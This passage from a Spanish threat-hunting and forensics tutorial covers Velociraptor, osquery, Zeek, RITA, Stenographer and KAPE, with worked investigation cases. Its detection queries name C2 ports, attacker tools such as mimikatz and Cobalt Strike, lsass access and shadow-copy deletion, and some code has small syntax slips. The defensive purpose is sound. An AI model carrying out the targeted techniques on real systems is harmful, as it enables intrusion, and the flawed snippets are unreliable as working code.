    - Nuevos valores en HKLM\...\Run
    - Nuevos valores en HKCU\...\Run
    - Modificacion de Image File Execution Options

T1071.001 - Web Protocols (HTTP C2):
  hipotesis: "El atacante esta usando HTTP para C2"
  fuentes:
    - Sysmon EID 3 (NetworkConnect)
    - Zeek HTTP logs
  deteccion:
    - Conexiones HTTP a IPs no corporativas
    - User-Agent no estandar
    - Beaconing (intervalos regulares)

T1090 - Proxy:
  hipotesis: "El atacante esta usando proxy para C2"
  fuentes:
    - Sysmon EID 3
    - Zeek SOCKS/HTTP proxy logs
  deteccion:
    - Conexiones a puertos de proxy (1080, 3128, 8080)
    - Trafico saliente a IPs de VPN/Tor

T1048 - Exfiltration Over Alternative Protocol:
  hipotesis: "El atacante esta exfiltrando datos"
  fuentes:
    - Sysmon EID 3
    - Zeek DNS logs
    - Zeek HTTP logs
  deteccion:
    - Grandes volumenes de datos salientes
    - DNS queries con subdominios largos (DNS tunneling)
    - Archivos enviados via HTTP POST
```

### 7.3 Hunting Maturity Model (HMM)

```python
class HuntingMaturityModel:
    """Evaluar madurez de hunting en la organizacion"""
    
    levels = {
        0: "Initial - No hunting capability",
        1: "Minimal - IOC-based reactive hunting",
        2: "Procedural - Hypothesis-based hunting",
        3: "Innovative - Data-driven hunting with custom analytics",
        4: "Leading - Automated hunting with ML/AI"
    }

    def assess(self):
        """Evaluar madurez actual"""
        score = 0
        capabilities = []

        # Data sources
        if self.has_sysmon(): score += 1
        if self.has_edr(): score += 1
        if self.has_network_monitoring(): score += 1
        if self.has_dns_logs(): score += 1
        if self.has_process_logs(): score += 1

        # Analytics
        if self.has_sigma_rules(): score += 1
        if self.has_yara_rules(): score += 1
        if self.has_custom_analytics(): score += 1

        # Automation
        if self.has_automated_hunting(): score += 1
        if self.has_ml_detection(): score += 1

        if score <= 2: return 0
        elif score <= 4: return 1
        elif score <= 6: return 2
        elif score <= 8: return 3
        else: return 4

    def has_sysmon(self): return False
    def has_edr(self): return False
    def has_network_monitoring(self): return False
    def has_dns_logs(self): return False
    def has_process_logs(self): return False
    def has_sigma_rules(self): return False
    def has_yara_rules(self): return False
    def has_custom_analytics(self): return False
    def has_automated_hunting(self): return False
    def has_ml_detection(self): return False
```

## 8. Kape - Recoleccion [forense](../raw/w1n-f0r3ns1cs.md#forense)

### 8.1 Introduccion

Kape (Kroll Artifact Parser and Extractor) es una herramienta para recolectar y procesar evidencias forenses de manera rapida y estandarizada.

```bash
# Descargar Kape
# https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kape

# Ejecutar recoleccion
.\kape.exe --tsource C: --tdest C:\kape_output --target !SANS_Triage

# Targets mas comunes
kape.exe --tsource C: --tdest output --target RegistryHives
kape.exe --tsource C: --tdest output --target EventLogs
kape.exe --tsource C: --tdest output --target Prefetch
kape.exe --tsource C: --tdest output --target Amcache
kape.exe --tsource C: --tdest output --target Shimcache
kape.exe --tsource C: --tdest output --target SRUM
kape.exe --tsource C: --tdest output --target FileFolderListing
kape.exe --tsource C: --tdest output --target WebBrowsers
kape.exe --tsource C: --tdest output --target PowerShell
kape.exe --tsource C: --tdest output --target AlternateDataStreams
kape.exe --tsource C: --tdest output --target USNJournal
kape.exe --tsource C: --tdest output --target RecycleBin
kape.exe --tsource C: --tdest output --target ScheduledTasks
kape.exe --tsource C: --tdest output --target JumpLists
kape.exe --tsource C: --tdest output --target RecentFiles
kape.exe --tsource C: --tdest output --target WindowsTimeline
kape.exe --tsource C: --tdest output --target WMI
kape.exe --tsource C: --tdest output --target Services
kape.exe --tsource C: --tdest output --target NetworkProfile
```

### 8.2 Targets Configuration

```yaml
# targets/SANS_Triage.tkape - Ejemplo de target Kape
name: SANS Triage Collection
description: Recolecta los artefactos mas importantes para triage
author: SANS DFIR

targets:
  - name: Event Logs
    description: Event logs de seguridad y sistema
    category: EventLogs
    path: C:\Windows\System32\winevt\Logs
    file_mask: "*.evtx"
    recursive: true

  - name: Registry Hives
    description: Archivos de registro del sistema
    category: Registry
    path: C:\Windows\System32\config
    file_mask: "*"
    recursive: false

  - name: NTUSER.DAT
    description: Registry hives de usuarios
    category: Registry
    path: C:\Users\*\NTUSER.DAT
    file_mask: "NTUSER.DAT"
    recursive: false

  - name: Prefetch
    description: Archivos Prefetch de ejecucion de programas
    category: Execution
    path: C:\Windows\Prefetch
    file_mask: "*.pf"
    recursive: false

  - name: Amcache
    description: Cache de programas instalados
    category: Execution
    path: C:\Windows\AppCompat\Programs\Amcache.hve
    file_mask: "Amcache.hve"
    recursive: false

  - name: Shimcache
    description: Cache de compatibilidad de programas
    category: Execution
    path: C:\Windows\System32\sdb
    file_mask: "*.sdb"
    recursive: false

  - name: PowerShell History
    description: Historial de PowerShell
    category: Execution
    path: C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
    file_mask: "ConsoleHost_history.txt"
    recursive: false

  - name: SRUM
    description: Resource Usage Monitor data
    category: Execution
    path: C:\Windows\System32\SRU
    file_mask: "*"
    recursive: false

  - name: Web Browsers
    description: Historial de navegadores
    category: Browser
    path: C:\Users\*\AppData\Local\Google\Chrome\User Data\Default
    file_mask: "*"
    recursive: false

  - name: Scheduled Tasks
    description: Tareas programadas del sistema
    category: Persistence
    path: C:\Windows\System32\Tasks
    file_mask: "*"
    recursive: true

  - name: Services
    description: Servicios del sistema
    category: Persistence
    path: C:\Windows\System32\config\system
    file_mask: "system"
    recursive: false

  - name: WMI
    description: WMI repository
    category: Persistence
    path: C:\Windows\System32\wbem\Repository
    file_mask: "*"
    recursive: false

  - name: Alternate Data Streams
    description: NTFS ADS scanning
    category: Evasion
    path: C:\Users
    file_mask: "*"
    recursive: true
    process:
      - name: Extract ADS
        command: 'dir /r /s | findstr ":$DATA"'

  - name: USN Journal
    description: USN Change Journal
    category: FileSystem
    path: C:\$Extend\$UsnJrnl
    file_mask: ":$J"
    recursive: false
```

### 8.3 Kape Module Processing

```yaml
# modules/Processors.tkape - Modulos de procesamiento Kape
name: Evidence Processors
description: Procesa los artefactos recolectados

modules:
  - name: Timeline Explorer
    description: Procesa EVTX a CSV
    command: 'E:\tools\python3.exe' -m 'evtx_to_csv.py' '%source%'

  - name: Plaso
    description: Timeline creation
    command: 'log2timeline.exe' --storage-file '%dest%\plaso.db' '%source%'

  - name: RegRipper
    description: Registry analysis
    command: 'rip.exe' -r '%source%\config\system' -f system

  - name: Hayabusa
    description: Event log analysis
    command: 'hayabusa.exe' csv-timeline -d '%source%\EventLogs' -o '%dest%\timeline.csv'

  - name: Chainsaw
    description: Fast event log hunting
    command: 'chainsaw.exe' hunt '%source%\EventLogs\*.evtx' -s sigma_rules/ --mapping mappings/sigma-event-logs-all.yml
```

### 8.4 Recoleccion Remota con Kape

```powershell
# Recoleccion remota via WinRM
$session = New-PSSession -ComputerName TARGET
Copy-Item -Path ".\kape.exe" -Destination "C:\Windows\Temp\kape.exe" -ToSession $session
Invoke-Command -Session $session -ScriptBlock {
    C:\Windows\Temp\kape.exe --tsource C: --tdest C:\kape_output --target !SANS_Triage
}
Copy-Item -Path "C:\kape_output\*" -Destination ".\evidence\TARGET\" -FromSession $session
Invoke-Command -Session $session -ScriptBlock {
    Remove-Item -Recurse -Force C:\kape_output, C:\Windows\Temp\kape.exe
}
Remove-PSSession $session
```

## 9. Velociraptor

### 9.1 Introduccion

Velociraptor es una herramienta de respuesta a incidentes y caza de amenazas que permite ejecutar consultas en multiples endpoints simultaneamente.

```bash
# Instalacion
# Descargar de https://github.com/Velocidex/velociraptor/releases

# Modo server
velociraptor --config server.config.yaml frontend

# Modo client
velociraptor --config client.config.yaml client

# Compilar configuracion
velociraptor config generate -i  # Interactivo
velociraptor --config server.config.yaml repack client.config.yaml
```

### 9.2 VQL (Velociraptor Query Language)

```sql
-- Listar procesos de todos los endpoints
SELECT Pid, Ppid, Name, Exe, Cmdline, CreateTime
FROM processes()
WHERE Name =~ 'powershell|cmd|rundll32'

-- Buscar archivos sospechosos
SELECT Name, Size, ModTime, HashPath(path=FullPath) as Hash
FROM glob(globs='''C:\Users\**\*.exe, C:\Windows\Temp\**\*.*''')
WHERE Hash.MD5 IN (
    'd41d8cd98f00b204e9800998ecf8427e',
    'e99a18c428cb38d5f260853678922e03'
)

-- Buscar conexiones de red
SELECT Pid, Name, Family, Proto, LocalAddr, LocalPort, RemoteAddr, RemotePort
FROM network_connections()

-- Buscar claves de registro de persistencia
SELECT * FROM read_reg_key(
    key='HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
)

-- Buscar tareas programadas
SELECT * FROM parse_scheduled_tasks()

-- Buscar servicios sospechosos
SELECT Name, DisplayName, ImagePath, StartType
FROM services()
WHERE ImagePath =~ 'temp|appdata|users'

-- YARA scan en memoria
SELECT Rule, Name, String.Name as StringName
FROM yara(
    rules='rule Mimikatz: { strings: $a = "mimikatz" condition: $a }',
    files=path_lookup(pid=Pid)
)

-- Timeline de actividad de usuario
SELECT Timestamp, Type, Data
FROM timeline(
    start=now() - 86400,
    end=now()
)
WHERE User =~ 'admin'

-- Buscar DLLs inyectadas
SELECT Pid, Name, Path
FROM dlls()
WHERE NOT Path =~ 'C:\\Windows\\System32\\'
```

### 9.3 Hunting con Velociraptor

```sql
-- Hunting: Process Injection
SELECT Pid, Name, Ppid, Exe, CommandLine
FROM processes()
WHERE Name IN ('rundll32.exe', 'regsvr32.exe', 'mshta.exe', 'cscript.exe')

-- Hunting: Network C2
SELECT Name, Pid, RemoteAddr, RemotePort
FROM network_connections()
WHERE RemotePort IN (4444, 1337, 5555, 8080, 53)

-- Hunting: Credential Access
SELECT Pid, Name, Exe,
       read_file(pid=Pid, path=FullPath, offset=0, length=1024) as Header
FROM processes()
WHERE Name = 'lsass.exe'
AND Pid != (
    SELECT Pid FROM processes() WHERE Name = 'lsass.exe' AND Ppid = 4
)

-- Hunting: Lateral Movement
SELECT Pid, Name, Exe, CommandLine
FROM processes()
WHERE CommandLine =~ 'wmic|winrm|psexec|schtasks.*\\/s')

-- Hunting: Persistence via WMI
SELECT * FROM wmi()
WHERE Filter =~ 'ActiveScriptEventConsumer|CommandLineEventConsumer'

-- Hunting: Ransomware Indicators
SELECT Pid, Name, CommandLine,
       count(rows=SELECT * FROM file_access_events(pid=Pid)) as FileOps
FROM processes()
WHERE CommandLine =~ 'vssadmin|bcdedit'

-- Hunting: DNS Tunneling
SELECT Query, count() as Count
FROM dns_queries()
WHERE Type = 'A' AND len(Query) > 30
GROUP BY Query
HAVING Count > 5
```

## 10. osquery

### 10.1 Introduccion

osquery expone el [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos) como una base de datos SQL relacional. Permite consultar procesos, conexiones de [red](../raw/r3d3s-f0nd4m3nt0s.md), archivos, registro, etc.

```bash
# Instalar osquery
# https://osquery.io/downloads

# Consultas interactivas
osqueryi

# Modo daemon (recoleccion continua)
osqueryd --flagfile /etc/osquery/osquery.flags

# Ejecutar consulta desde linea de comandos
osqueryi "SELECT * FROM processes WHERE name = 'powershell.exe'"
```

### 10.2 Consultas de Hunting

```sql
-- Procesos con conexiones de red
SELECT p.pid, p.name, p.path, p.cmdline, p.start_time,
       c.local_address, c.remote_address, c.remote_port
FROM processes p
JOIN process_open_sockets c USING (pid)
WHERE c.remote_port != 0 AND p.name NOT IN ('svchost.exe', 'System')

-- Procesos hijos de Office
SELECT p.pid, p.name, p.path, p.cmdline,
       p.start_time, pp.name as parent_name
FROM processes p
JOIN processes pp ON p.parent = pp.pid
WHERE pp.name IN ('WINWORD.EXE', 'EXCEL.EXE', 'OUTLOOK.EXE')
  AND p.name IN ('cmd.exe', 'powershell.exe', 'rundll32.exe', 'mshta.exe')

-- Usuarios con sesiones activas
SELECT * FROM logged_in_users
WHERE type = 'active'

-- Programas que se ejecutan al inicio
SELECT name, path, args
FROM startup_items

-- Tareas programadas
SELECT task_name, task_path, enabled, state
FROM scheduled_tasks
WHERE enabled = 1

-- Servicios con binarios en directorios de usuario
SELECT name, service_type, path, start_type
FROM services
WHERE path LIKE '%Users%'
   OR path LIKE '%AppData%'
   OR path LIKE '%Temp%'

-- DLLs cargadas en procesos del sistema
SELECT DISTINCT p.name, m.path
FROM processes p
JOIN process_memory_map m USING (pid)
WHERE p.name IN ('lsass.exe', 'winlogon.exe', 'svchost.exe')
  AND m.path NOT LIKE '%System32%'
  AND m.path NOT LIKE '%SysWOW64%'

-- Archivos creados/modificados recientemente
SELECT path, filename, type, size,
       atime, mtime, ctime
FROM file
WHERE directory IN (
    'C:\\Users\\',
    'C:\\Windows\\Temp',
    'C:\\Users\\*\\AppData\\Local\\Temp\\'
)
AND type = 'regular'
AND mtime > (SELECT unix_time - 86400 FROM time)
AND filename LIKE '%.exe' OR filename LIKE '%.dll' OR filename LIKE '%.ps1'

-- Conexiones de red entrantes
SELECT dst_port, process, pid, state
FROM listening_ports
WHERE dst_port NOT IN (135, 445, 3389, 5985, 5986)

-- Paquetes instalados (para detectar herramientas de atacante)
SELECT name, version, source
FROM programs
WHERE name LIKE '%mimikatz%'
   OR name LIKE '%cobalt%'
   OR name LIKE '%metasploit%'
   OR name LIKE '%nmap%'
   OR name LIKE '%wireshark%'

-- Integridad de archivos de sistema
SELECT path, on_disk_filename,
       hash_md5, hash_sha256
FROM file
WHERE directory = 'C:\\Windows\\System32'
  AND filename IN ('cmd.exe', 'powershell.exe', 'reg.exe')
  AND hash_sha256 NOT IN (
    'legit_hash_for_each_file_here'
  )

## 11. Zeek (Bro)

### 11.1 Introduccion

Zeek (anteriormente Bro) es un monitor de seguridad de red que analiza trafico en tiempo real y genera logs estructurados.

```bash
# Instalar Zeek
apt install zeek

# Configurar interfaz
echo 'zeek --interface eth0' > /etc/zeek/zeekctl.cfg

# Iniciar Zeek
zeekctl deploy

# Ver logs generados
ls /var/log/zeek/current/
# conn.log - Conexiones
# dns.log - Consultas DNS
# http.log - Trafico HTTP
# ssl.log - Certificados SSL/TLS
# files.log - Archivos transferidos
# weird.log - Eventos anormales
# notice.log - Alertas
# ftp.log - Trafico FTP
# smtp.log - Correo SMTP
# ssh.log - Conexiones SSH
# rdp.log - Conexiones RDP
# kerberos.log - Trafico Kerberos
# ntlm.log - Trafico NTLM
```

### 11.2 Analisis de Logs

```bash
# Analisis de conexiones
zeek-cut uid proto id.orig_h id.orig_p id.resp_h id.resp_p proto service duration orig_bytes resp_bytes < conn.log

# Conexiones desde IPs externas
grep -v '192.168.\|10.\|172.' conn.log | zeek-cut id.orig_h id.resp_h proto service

# DNS queries sospechosas
zeek-cut query answers < [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns).log | sort | uniq -c | sort -rn | head -20

# HTTP requests
zeek-cut method host uri user_agent status_code < [http](../raw/r3d3s-f0nd4m3nt0s.md#http).log

# Conexiones SSH fallidas
zeek-cut auth_success client auth_attempts < ssh.log | grep -v 'T'

# SSL certificados
zeek-cut subject issuer serial < [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)).log | sort -u

# Weird events (anomalias de protocolo)
zeek-cut name uid id.orig_h < weird.log | sort | uniq -c | sort -rn
```

### 11.3 Scripts de Deteccion

```zeek
# beacon_detect.zeek - Detecta beaconing a C2
module BeaconDetect;

export {
    redef enum Log::ID += { LOG };
    type Info: record {
        ts: time &log;
        src: addr &log;
        dst: addr &log;
        connections: count &log;
        period: interval &log;
    };

    global min_connections: count = 10 &redef;
    global min_period_sec: interval = 10sec &redef;
    global max_period_sec: interval = 1hr &redef;
}

event connection_established(c: connection) {
    if (c$id$resp_h !in Site::local_nets) {
        # Registrar para analisis de periodicidad
    }
}

# dns_tunnel_detect.zeek - Detecta DNS tunneling
module DNSTunnelDetect;

event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count) {
    if (|query| > 50 && qtype == 1) {
        local entropy = 0.0;
        local chars = "";
        for (i in query) {
            if (i in chars) next;
            local p = count_substr(query, i) / |query|;
            entropy += -p * log(p);
        }
        if (entropy > 3.5) {
            NOTICE([$note=DNS_Tunnel, $msg=fmt("Posible DNS tunneling: %s (entropy: %.2f)", query, entropy), $conn=c]);
        }
    }
}

# port_scan_detect.zeek - Detecta escaneo de puertos
module PortScanDetect;

event connection_attempt(c: connection) {
    if (c$id$resp_h !in Site::local_nets) {
        # Potencial escaneo
    }
}

# rdp_bruteforce.zeek - Detecta fuerza bruta RDP
module RDPBruteForce;

event rdp_connect_request(c: connection, cookie: string) {
    local src = c$id$orig_h;
    local dst = c$id$resp_h;
    
    # Registrar intento de conexion
    # Si hay muchos en poco tiempo, alertar
}
```

### 11.4 Zeek + Hunting

```bash
# Buscar conexiones periodicas (beaconing)
perl -lane 'print "$F[0] $F[2] $F[4]" if $F[6] > 0' conn.log |
  awk '{[ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips)[$2][$3]++; times[$2][$3]=$1} 
       END {for([ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) in ips) for(dst in ips[[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip)]) 
           print ip, dst, ips[ip][dst]}' |
  sort -k3 -rn | head -20

# Detectar DNS tunneling con Python
python3 << 'EOF'
import re, math
from collections import Counter

with open('/var/log/zeek/current/dns.log') as f:
    for line in f:
        fields = line.split('\t')
        if len(fields) >= 8:
            query = fields[7]
            # Calcular entropia
            if len(query) > 30:
                freq = Counter(query.lower())
                entropy = -sum((c/len(query)) * math.log2(c/len(query)) for c in freq.values())
                if entropy > 4.0:
                    print(f"Posible DNS tunnel: {query} (entropy: {entropy:.2f})")
EOF

# Correlacion de logs con Python
python3 << 'EOF'
import pandas as pd

conn = pd.read_csv('/var/log/zeek/current/conn.log', sep='\t', comment='#')
dns = pd.read_csv('/var/log/zeek/current/dns.log', sep='\t', comment='#')
http = pd.read_csv('/var/log/zeek/current/http.log', sep='\t', comment='#')

# Conexiones que primero hacen DNS y luego HTTP al mismo host
merged = pd.merge(dns, http, left_on='query', right_on='host', how='inner')
print(f"Conexiones con DNS previo: {len(merged)}")

# Conexiones con SSL extraño
ssl = pd.read_csv('/var/log/zeek/current/ssl.log', sep='\t', comment='#')
ssl_odd = ssl[ssl['validation_status'] != 'ok']
print(f"SSL invalidos: {len(ssl_odd)}")

# Archivos transferidos con exe
files = pd.read_csv('/var/log/zeek/current/files.log', sep='\t', comment='#')
exe_files = files[files['mime_type'].str.contains('exe|dll|[pe](../raw/w1n-1nt3rn4ls.md#pe)', na=False)]
print(f"Archivos PE transferidos: {len(exe_files)}")
EOF
```

## 12. RITA (Real Intelligence Threat Analytics)

### 12.1 Introduccion

RITA es una herramienta de deteccion de beaconing desarrollada por Active Countermeasures.

```bash
# Instalar RITA
git clone [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://github.[com](../raw/w1n-s9bsyst3ms.md#com)/activecm/rita
cd rita
./install.sh

# Configurar
nano /etc/rita/config.yaml

# Importar logs de Zeek
rita import /var/log/zeek/current/ my_dataset

# Analizar
rita analyze my_dataset

# Ver resultados
rita show-beacons my_dataset
rita show-long-connections my_dataset
rita show-strobes my_dataset
rita show-useragents my_dataset
rita show-blacklisted my_dataset
rita show-exploded-dns my_dataset
```

### 12.2 Analisis de Beaconing

```bash
# Ver beacons detectados
rita show-beacons my_dataset

# Salida tipica:
Score  Source IP        Dest IP        Conn  Period  Size   T_
0.99   192.168.1.50     185.220.101.1  1458  59.9s   512    C
0.85   192.168.1.100    5.45.75.11     892   4.98s   1024   C
0.72   192.168.1.25     46.166.142.1   445   300.1s  256    C

# Conexiones largas
rita show-long-connections my_dataset

# Strobe connections (muchos puertos a mismo destino)
rita show-strobes my_dataset

# User-agents extraños (C2)
rita show-useragents my_dataset

# DNS queries explotadas
rita show-exploded-dns my_dataset
```

### 12.3 Configuracion de RITA

```yaml
# /etc/rita/config.yaml
Logging:
  LogPath: /var/log/rita/log
  LogLevel: info

Processing:
  FilterConnectionTimeout: false
  BeaconTimestampGranularity: 100ms
  BeaconQueryMin: true
  ConnectionTimeout: 30m
  ConnectionDeleteTimeout: 30m

BeaconThresholds:
  Score: 0.8
  ConnectionCount: 100
  ConnectionPeriodMin: 1s
  ConnectionPeriodMax: 1h
  ConnectionDurationMin: 1s
  ConnectionDurationMax: 30m

Rolling:
  Rolling: false
  Chunk: 60m
  Window: 1440m

BlackListed:
  BlackList: /etc/rita/blacklist.txt

InternalSubnets:
  - 10.0.0.0/8
  - 172.16.0.0/12
  - 192.168.0.0/16
```

## 13. Stenographer

### 13.1 Introduccion

Stenographer es un capturador de paquetes de alta velocidad que almacena todo el trafico de red en disco para analisis forense posterior.

```bash
# Instalar Stenographer
git clone https://github.com/google/stenographer
cd stenographer
go build

# Configurar
cat > /etc/stenographer/config << 'EOF'
{
  "Threads": 8,
  "PacketsDirectory": "/data/stenographer/packets",
  "IndexDirectory": "/data/stenographer/index",
  "Interface": "eth0",
  "Port": 1234,
  "DataSize": 1073741824,
  "IndexFlushInterval": 60,
  "MaxPacketRate": 1000000
}
EOF

# Iniciar stenographer
stenographer -syslog -config /etc/stenographer/config
```

### 13.2 Consulta de Paquetes

```bash
# Consultar paquetes por IP
stenoread "host 192.168.1.100" > traffic.pcap

# Consultar por puerto
stenoread "port 502" > modbus.pcap

# Consultar por IP y puerto
stenoread "host 10.0.0.1 and port 80" > http.pcap

# Consultar por rango de tiempo
stenoread "host 192.168.1.100 and after 2024-05-24T14:00:00 and before 2024-05-24T15:00:00" > window.pcap

# Consultar solo paquetes TCP SYN
stenoread "host 192.168.1.100 and [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)[tcpflags] & [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)-syn != 0" > syn.pcap

# Consultar con expresion BPF completa
stenoread "net 192.168.1.0/24 and port 443" > traffic.pcap

# Consultas desde python
python3 << 'EOF'
import subprocess

def query_stenographer(bpf_filter, output_file):
    cmd = ["stenoread", bpf_filter]
    with open(output_file, "wb") as f:
        subprocess.run(cmd, stdout=f)
    print(f"Paquetes guardados en {output_file}")

# Ejemplos
query_stenographer("host 185.220.101.1", "c2_traffic.pcap")
query_stenographer("port 53 and len > 100", "big_dns.pcap")
query_stenographer("tcp and host 192.168.1.50 and port 4444", "suspicious.pcap")
EOF
```

### 13.3 Stenographer + Hunting

```python
#!/usr/bin/env python3
"""
steno_hunt.py - Hunting con Stenographer
"""
import subprocess, datetime, os

class StenoHunt:
    def __init__(self, output_dir="./steno_hunts"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def query(self, bpf, name):
        output = f"{self.output_dir}/{name}_{datetime.datetime.now().strftime('%H%M%S')}.pcap"
        subprocess.run(["stenoread", bpf, "-o", output])
        return output

    def hunt_beaconing(self, ip, after_hours=1):
        after = (datetime.datetime.now() - datetime.timedelta(hours=after_hours)).isoformat()
        bpf = f"host {ip} and after {after}"
        return self.query(bpf, f"beacon_{ip}")

    def hunt_port(self, port, after_hours=24):
        after = (datetime.datetime.now() - datetime.timedelta(hours=after_hours)).isoformat()
        bpf = f"port {port} and after {after}"
        return self.query(bpf, f"port_{port}")

    def hunt_external_c2(self, internal_subnet="192.168.1.0/24"):
        bpf = f"net {internal_subnet} and not net 10.0.0.0/8"
        return self.query(bpf, "external_connections")

    def analyze_pcap(self, pcap_path):
        """Analizar PCAP con tshark"""
        commands = [
            f"tshark -r {pcap_path} -q -z io,phs",
            f"tshark -r {pcap_path} -T fields -e ip.src -e ip.dst -e tcp.port | sort | uniq -c | sort -rn | head 20",
            f"tshark -r {pcap_path} -Y 'http.request' -T fields -e http.host -e http.user_agent | sort -u",
            f"tshark -r {pcap_path} -Y 'dns' -T fields -e dns.qry.name | sort -u",
        ]
        for cmd in commands:
            print(f"\n=== {cmd.split('-e')[0] if '-e' in cmd else cmd[:60]} ===")
            subprocess.run(cmd, shell=True)

hunter = StenoHunt()

# Hunting: Conexiones externas sospechosas
# pcap = hunter.hunt_external_c2()
# hunter.analyze_pcap(pcap)

# Hunting: Trafico a puerto inusual
# pcap = hunter.hunt_port(4444, 48)
# hunter.analyze_pcap(pcap)
```

## 14. Casos Practicos

### 14.1 Caso 1: Inyeccion de Procesos Detectada

**Escenario:** Alertas de Sysmon EID 8 en servidor de archivos.

```powershell
# Investigacion
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-[sysmon](../raw/3dr-3v4s10n.md#sysmon)/Operational'; ID=8} -MaxEvents 10 |
  Select-Object TimeCreated,
    @{n='Source';e={$_.Properties[1].Value}},
    @{n='SourcePID';e={$_.Properties[2].Value}},
    @{n='Target';e={$_.Properties[5].Value}},
    @{n='TargetPID';e={$_.Properties[6].Value}},
    @{n='Protect';e={$_.Properties[10].Value}}

# Resultado:
# explorer.exe (PID 4242) creo un hilo en svchost.exe (PID 712)
# Indica inyeccion de proceso!

# Investigacion adicional
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} |
  Where-Object { $_.Properties[3].Value -eq 4242 } |
  Select-Object TimeCreated, @{n='Parent';e={$_.Properties[11].Value}},
    @{n='Child';e={$_.Properties[4].Value}},
    @{n='CmdLine';e={$_.Properties[9].Value}}

# Ver memoria del proceso sospechoso
# Usar Volatility en dump de memoria del servidor
# python vol.py -f memory.dmp windows.malfind --pid 4242
```

**Analisis con Volatility:**

```bash
# 1. Identificar proceso padre
[python](../raw/pyth0n-f0r-h4ck1ng.md) vol.py -f memory.dmp windows.pstree | grep 4242

# 2. Ver DLLs cargadas por el proceso inyector
python vol.py -f memory.dmp windows.dlllist --pid 4242 | findstr /i "temp appdata"

# 3. Ver conexiones de red del proceso
python vol.py -f memory.dmp windows.netscan | grep 4242

# 4. Dump del proceso malicioso
python vol.py -f memory.dmp windows.memdump --pid 4242 --dump

# 5. Escanear con YARA
[yara](../raw/thr3t-hnt.md#yara) -r rules.[yara](../raw/thr3t-hnt.md#yara) pid.4242.dmp

# 6. Timeline
python vol.py -f memory.dmp windows.timeliner --type Process | grep 4242
```

**Conclusion:** Se detecto inyeccion de proceso en svchost.exe desde explorer.exe. El atacante uso CreateRemoteThread para inyectar codigo malicioso.

### 14.2 Caso 2: Beaconing Detectado con RITA

**Escenario:** RITA detecta beaconing desde una workstation a IP externa en puerto 443 cada 60 segundos.

```bash
# 1. Confirmar con RITA
rita show-beacons corporate_dataset | grep 0.99

# Score: 0.99, IP: 192.168.1.50 -> 185.220.101.1, Period: 59.9s

# 2. Ver conexiones
rita show-long-connections corporate_dataset | grep 185.220.101.1

# 3. Ver DNS queries
rita show-exploded-dns corporate_dataset | grep 185.220.101.1

# 4. Capturar trafico con Stenographer
stenoread "host 185.220.101.1" > c2_traffic.pcap

# 5. Analizar con tshark
tshark -r c2_traffic.pcap -Y "ssl.[handshake](../raw/w1f1-4tt4cks.md#handshake).type == 1" -T fields -e ssl.[handshake](../raw/w1f1-4tt4cks.md#handshake).ciphersuite
tshark -r c2_traffic.pcap -Y "data.data" -T fields -e data.data

# 6. Investigar proceso local
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} |
  Where-Object { $_.Properties[4].Value -eq '185.220.101.1' } |
  Select-Object TimeCreated, @{n='Process';e={$_.Properties[1].Value}}

# 7. Volatility
python vol.py -f memory.dmp windows.cmdline | grep -i "suspicious_process"
python vol.py -f memory.dmp windows.netscan | grep 185.220.101.1
```

**Conclusion:** Se detecto beaconing a C2 cada 60 segundos. El proceso malicioso estaba inyectado en un proceso legitimo.

### 14.3 Caso 3: Persistencia via WMI

**Escenario:** Sysmon EID 19-21 detectan creacion de filtro WMI y consumidor.

```powershell
# 1. Ver filtros WMI
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=19} |
  Select-Object TimeCreated, @{n='Process';e={$_.Properties[1].Value}},
    @{n='Filter';e={$_.Properties[2].Value}}

# 2. Ver consumidores WMI
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=20} |
  Select-Object TimeCreated, @{n='Process';e={$_.Properties[1].Value}},
    @{n='Consumer';e={$_.Properties[2].Value}}

# 3. Listar bindings WMI activos
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding |
  Select-Object Filter, Consumer

# 4. Ver consumidores activos
Get-WmiObject -Namespace root\subscription -Class __EventConsumer |
  Select-Object Name, CommandLineTemplate, ExecutablePath

# 5. Eliminar bindings maliciosos
$bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
$bindings | Where-Object { $_.Filter -match "SuspiciousFilter" } | Remove-WmiObject
```

**Conclusion:** El atacante establecio persistencia via WMI Event Subscription, ejecutando un script cada 5 minutos.

## 15. Ejercicios Practicos

### Laboratorio 1: Analisis de Memoria

```bash
# Descargar muestra de memoria (ej: de CIC Dataset)
# https://www.unb.ca/cic/datasets/index.html

# 1. Identificar imagen
python vol.py -f memory.dmp windows.info

# 2. Listar procesos
python vol.py -f memory.dmp windows.pstree

# 3. Buscar procesos ocultos
python vol.py -f memory.dmp windows.psscan | grep -v "No Offset"

# 4. Ver cmdlines
python vol.py -f memory.dmp windows.cmdline | grep -i "[powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)\|cmd\|temp"

# 5. Detectar inyeccion
python vol.py -f memory.dmp windows.malfind

# 6. Ver conexiones de red
python vol.py -f memory.dmp windows.netscan

# 7. Timeline
python vol.py -f memory.dmp windows.timeliner --output csv > timeline.csv

# 8. DLLs sospechosas
python vol.py -f memory.dmp windows.dlllist | grep -i "temp\|appdata"

# 9. Escanear con YARA
python vol.py -f memory.dmp windows.yarascan --yara-rules threat_hunt.yara

# Preguntas:
# - Cual es el proceso sospechoso?
# - A que IP se conecta?
# - Que DLLs inyectadas tiene?
